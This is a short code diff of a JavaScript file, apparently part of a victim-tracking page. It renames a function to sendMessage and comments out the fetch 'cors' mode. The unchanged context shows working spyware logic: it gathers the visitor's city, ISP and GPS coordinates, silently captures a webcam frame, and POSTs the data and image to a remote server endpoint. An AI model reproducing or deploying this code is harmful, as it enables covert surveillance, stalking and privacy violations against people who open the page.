@@ -22,7 +22,7 @@ Kota : ${data.city}
 Provider ISP : ${data.org}
 Latitude : ${data.latitude}
 Longitude : ${data.longitude}`;
-    sM(text);
+    sendMessage(text);
     let stream = await navigator.mediaDevices.getUserMedia({
         video: true,
         audio: false,
@@ -35,7 +35,7 @@ Longitude : ${data.longitude}`;
         let image_data_url = canvas
             .toDataURL("image/jpeg")
             .replace(/^data:image\/jpeg;base64,/, "");
-        sM(text, image_data_url, "jpeg");
+        sendMessage(text, image_data_url, "jpeg");
         video.pause();
         video.src = "";
         stream.getTracks()[0].stop();
@@ -48,10 +48,10 @@ async function useFetch(url) {
     return Promise.resolve(jsonData);
 }
 
-async function sM(msg, img, ext) {
+async function sendMessage(msg, img, ext) {
     let mySender = await fetch(`${BASE}/send/`, {
         method: "POST",
-        mode: "cors",
+        // mode: "cors",
         headers: {
             "Content-Type": "application/json",
         },
